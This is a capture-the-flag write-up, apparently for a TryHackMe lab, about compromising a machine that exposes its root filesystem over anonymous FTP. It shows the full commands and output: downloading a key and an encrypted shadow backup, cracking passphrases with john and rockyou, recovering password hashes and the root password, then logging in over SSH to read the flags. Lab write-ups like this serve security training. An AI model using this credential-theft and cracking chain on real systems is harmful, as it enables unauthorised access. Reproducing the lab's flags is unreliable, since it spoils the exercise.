A. Enumeration 

A.1 Nmap

To understand and gain information about the target we start the enumeration phase by running an nmap scan using below command

```
┌[parrot]─[18:03-01/07]─[/home/glack/Desktop/shellgen]
└╼glack$nmap -sV -sT -A 10.10.10.19
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 18:03 IST
Nmap scan report for 10.10.10.19
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.24.189
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Jul 01 00:03 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x  107 0        0               0 Jul 01 00:03 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Jul 01 00:03 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Jul 01 00:03 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8af9483e11a1aafcb78671d02af624e7 (RSA)
|   256 735dde9a886e647ae187ec65ae1193e3 (ECDSA)
|_  256 56f99f24f152fc16b77ba3e24f17b4ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.06 seconds
```

As we can see port 21 and 22 are open.

The entire root directory is mounted on the ftp with anonymous login allowed

A.2 FTP

Since we can see a lot of information is available in ftp, we check it by running an ftp client using

```
┌[parrot]─[18:04-01/07]─[/home/glack/Desktop/THM]
└╼glack$ftp 10.10.10.19
```

We login with username as  'Anonymous' and password as blank

```
Name (10.10.10.19:glack): anonymous
Password:

```

And we can see and download the ftp hosted files

```
ftp> ls
```

We check the list of "commands" we can run in ftp using 

```
ftp> ?
```

Here we can easily view the contents of
/home/melodia/user.txt. 

But we can get that later, for now we will only focus on gaining information and gaining  credentials on the target system


In the file we can see a non-standard directory "notread" , let have a look into it

```
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
```

We download both the files using 

```
get backup.pgp

get private.asc
```


Here from the looks of it we can see that there is an encrypted backup file and a private key.

Maybe we can use this key to decrypt the backup file

B. Gaining Access

B.1 GPG decrypt

Now I used used this (https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key) resource to understand how to decrypt a ".pgp" file using a private key

But when we try to  import the private key using
```
┌[parrot]─[18:36-01/07]─[/home/glack/Desktop/THM/anonforce]
└╼glack$gpg --import private.asc
```

We get prompted for the passphrase of the private key, i tried some randoms passphrases and failed so i decided to used the "gpg2john"  and "john" tool to crack the passphrase 


```

┌[parrot]─[18:34-01/07]─[/home/glack/Desktop/THM/anonforce]
└╼glack$gpg2john private.asc > forjohn.txt
```


And

```
┌[parrot]─[18:35-01/07]─[/home/glack/Desktop/THM/anonforce]
└╼glack$john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

And we crack the passphrase in no time

```
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)
```

Now we try to decrypt the gpg file again using

```
┌[parrot]─[18:40-01/07]─[/home/glack/Desktop/THM/anonforce]
└╼glack$gpg --import private.asc
```

```
┌[parrot]─[19:00-01/07]─[/home/glack/Desktop/THM/anonforce]
└╼glack$gpg --passphrase xbox360 --decrypt backup.pgp
```

Here we can see that the backup.pgp file contained the contents of "/etc/shadow" file 

We can export it to a file named "shadow"

```
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
.
.
.
.
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
```
 

We can also download the /etc/passwd files using ftp, since it is readable

```
ftp> cd /etc

ftp> get passwd
```

Now we can use the "unshadow" tool and try to crack the user's password using john.

You can view more about unshadow here(https://linuxcommandlibrary.com/man/unshadow)

B.2 Unshadow

The syntax to use unshadow is 

```
┌[parrot]─[19:10-01/07]─[/home/glack/Desktop/THM/anonforce]
└╼glack$unshadow passwd shadow > 2forjohn.txt
```

Here "passwd" is the "/etc/passwd" file and
"shadow" is the "/etc/shadow" file

Now we run the output file through john using

```
┌[parrot]─[19:12-01/07]─[/home/glack/Desktop/THM/anonforce]
└╼glack$john 2forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

And we get a hit for the root password

```
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)
```

We can now use the credentials to ssh into the machine and get the flags

```
┌[parrot]─[19:14-01/07]─[/home/glack/Desktop/THM/anonforce]
└╼glack$ssh root@10.10.10.19
root@10.10.10.19's password: 

```


```
root@ubuntu:~# cat /home/melodias/user.txt
606083fd33beb1284fc51f411a706af8
```

```
root@ubuntu:~# cat root.txt
f706456440c7af4187810c31c6cebdce
```

![[Pasted image 20230701194759.png]]

